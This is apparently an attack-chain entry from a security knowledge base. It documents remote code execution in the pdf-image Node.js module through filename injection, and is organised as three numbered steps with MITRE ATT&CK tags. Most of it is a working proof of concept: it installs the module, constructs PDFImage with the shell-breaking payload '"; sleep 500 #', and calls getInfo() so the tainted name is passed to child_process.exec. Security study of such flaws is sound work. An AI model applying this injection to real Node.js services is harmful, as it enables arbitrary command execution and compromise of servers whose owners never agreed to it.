---
tags:
  - rce
  - node.js
  - command-injection
  - pdf-image
type: attack_chain
tools:
  - '[[tools/pdf-image-exploit-script]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Require-and-Initialize-pdf-image-Module]]'
  - '[[procedures/Instantiate-PDFImage-with-Malicious-Input]]'
  - '[[procedures/Trigger-RCE-via-getInfo-Method]]'
step_count: 3
techniques:
  - '[[Unix Shell]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:32.590Z'
description: >-
  A multi-step attack exploiting unsanitized user input in the pdf-image Node.js
  module to achieve remote code execution through shell command injection using
  ImageMagick.
skill_level: intermediate
impact_level: high
id: 31ecdaf7-4040-4248-927a-57dce597828d
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploit Public-Facing Application]]'
---
# Remote Code Execution in pdf-image Node.js Module via Malicious Filename Injection

Multi-stage attack chain demonstrating remote code execution in the pdf-image Node.js module by injecting malicious shell commands through unsanitized filename input, leading to arbitrary code execution on the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Require Module] --> B[Inject Malicious Input]
    B --> C[Trigger Execution]
    C --> D[Arbitrary Code Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/pdf-image-exploit-script]]

### Target Environment

- Node.js runtime (version compatible with pdf-image module)
- ImageMagick installed on the system
- No specific ports or services required; assumes local or remote Node.js application using the module

### Initial Access Requirements

- Access to the Node.js application source or ability to provide user-controlled input (e.g., via API or file upload)
- No credentials needed if input is unauthenticated
- Prior knowledge of the application using pdf-image for PDF processing

## Detailed Attack Procedures

### Step 1: Require and Initialize pdf-image Module
procedure: [[procedures/Require-and-Initialize-pdf-image-Module]]

**Objective**: Load the vulnerable pdf-image module into the Node.js environment to prepare for exploitation.

**Instructions**: Install and require the pdf-image module using npm, then import the PDFImage class.

```bash
npm install pdf-image
```

In a Node.js script:

```javascript
const PDFImage = require("pdf-image").PDFImage;
```

**Expected Output**: Module loads without errors, PDFImage class is available.

**Success Indicators**:
- No import errors in console
- PDFImage constructor is accessible

### Step 2: Instantiate PDFImage with Malicious Input
procedure: [[procedures/Instantiate-PDFImage-with-Malicious-Input]]

**Objective**: Create a PDFImage instance using a crafted filename that includes shell metacharacters to break out of command quoting.

**Instructions**: Use a payload like '"; sleep 500 #' as the filename to inject a command. This exploits the lack of sanitization in the constructor.

```javascript
const pdfImage = new PDFImage('"; sleep 500 #');
```

**Expected Output**: Object created, but any subsequent shell-invoking method will execute the injected command.

**Success Indicators**:
- Instance created successfully
- No immediate errors, setting up for injection

### Step 3: Trigger RCE via getInfo Method
procedure: [[procedures/Trigger-RCE-via-getInfo-Method]]

**Objective**: Invoke the getInfo() method to execute the underlying ImageMagick shell command, triggering the injected payload for arbitrary code execution.

**Instructions**: Call getInfo() on the malicious instance, which passes the tainted filename to child_process.exec.

```javascript
pdfImage.getInfo().then((info) => {
  console.log(info);
}).catch((err) => {
  console.error(err);
});
```

Observe the process hanging for 500 seconds due to the sleep command, confirming injection.

**Expected Output**: Process pauses for 500 seconds; no output from getInfo() but command executes.

**Success Indicators**:
- Application hangs or executes visible side effects (e.g., file listing if using ls payload)
- Logs show ImageMagick command with injected payload

## Attack Chain Summary

### Key Achievements

1. Successfully loaded the vulnerable pdf-image module in a Node.js environment.
2. Injected shell commands via unsanitized filename input to bypass quoting.
3. Achieved remote code execution, demonstrating potential for server compromise through arbitrary command injection.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
